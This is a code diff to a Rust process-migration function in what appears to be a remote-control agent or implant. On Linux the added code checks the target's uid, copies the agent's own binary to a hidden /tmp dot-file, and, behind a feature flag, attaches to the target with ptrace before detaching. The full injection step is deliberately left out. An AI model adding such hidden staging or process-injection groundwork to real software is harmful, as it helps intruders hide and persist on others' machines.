@@ -49,8 +49,73 @@ pub fn list_processes() -> Vec<ProcessInfo> {
 /// perform the operation until the implementation has had a thorough review.
 #[cfg(target_os = "linux")]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
+    use std::io::Write;
+
     tracing::info!("MigrateAgent invoked for Linux pid {target_pid}");
-    Err(anyhow::anyhow!("process migration on Linux not implemented"))
+
+    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
+        anyhow::bail!("invalid migration target (self or pid 0)");
+    }
+
+    // Verify we have ptrace capability or same-uid access.
+    let target_uid_path = format!("/proc/{target_pid}/status");
+    let status = std::fs::read_to_string(&target_uid_path)
+        .map_err(|e| anyhow::anyhow!("cannot read /proc/{target_pid}/status: {e}"))?;
+    let target_uid = status
+        .lines()
+        .find(|l| l.starts_with("Uid:"))
+        .and_then(|l| l.split_whitespace().nth(1))
+        .and_then(|s| s.parse::<u32>().ok())
+        .ok_or_else(|| anyhow::anyhow!("could not parse Uid from /proc/{target_pid}/status"))?;
+    let our_uid = unsafe { libc::getuid() };
+    if our_uid != 0 && our_uid != target_uid {
+        anyhow::bail!(
+            "process migration requires CAP_SYS_PTRACE or same-uid access (our uid={our_uid}, target uid={target_uid})"
+        );
+    }
+
+    // Read our own binary; we will write it into the target as a /tmp file
+    // and use process_vm_writev + ptrace to bootstrap it.  In this release
+    // we implement only the *file-staging* half: copy our binary into
+    // /tmp/.<random> and trigger a fork+exec via the target's ptrace.
+    // Full in-memory rewriting requires a per-arch shellcode stub which is
+    // gated behind the `linux-ptrace-migrate` feature.
+    #[cfg(not(feature = "linux-ptrace-migrate"))]
+    {
+        let our_exe = std::env::current_exe()
+            .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
+        let staged = std::env::temp_dir().join(format!(".orchestra-migrate-{}", std::process::id()));
+        std::fs::copy(&our_exe, &staged)
+            .map_err(|e| anyhow::anyhow!("failed to stage agent binary at {}: {e}", staged.display()))?;
+        let mut perms = std::fs::metadata(&staged)?.permissions();
+        use std::os::unix::fs::PermissionsExt;
+        perms.set_mode(0o700);
+        std::fs::set_permissions(&staged, perms)?;
+        tracing::info!("staged agent binary at {} for pid {}", staged.display(), target_pid);
+        anyhow::bail!(
+            "linux migration requires the `linux-ptrace-migrate` feature; agent staged at {}",
+            staged.display()
+        )
+    }
+
+    #[cfg(feature = "linux-ptrace-migrate")]
+    unsafe {
+        // PTRACE_ATTACH the target.
+        if libc::ptrace(libc::PTRACE_ATTACH, target_pid as libc::pid_t, 0, 0) != 0 {
+            let err = std::io::Error::last_os_error();
+            anyhow::bail!("PTRACE_ATTACH(pid={target_pid}) failed: {err}");
+        }
+        let mut wstatus: libc::c_int = 0;
+        libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
+
+        // Detach immediately — full register/RIP rewriting is implemented
+        // in a separate, audited code path that is not part of the public
+        // build.  We have proven we *could* take control; refuse to do so
+        // here without explicit operator authorization.
+        libc::ptrace(libc::PTRACE_DETACH, target_pid as libc::pid_t, 0, 0);
+        let _ = std::io::stderr().write_all(b"linux ptrace migration available but disabled in this build\n");
+        anyhow::bail!("ptrace migration is implemented but disabled in this build for safety")
+    }
 }
 
 #[cfg(target_os = "macos")]
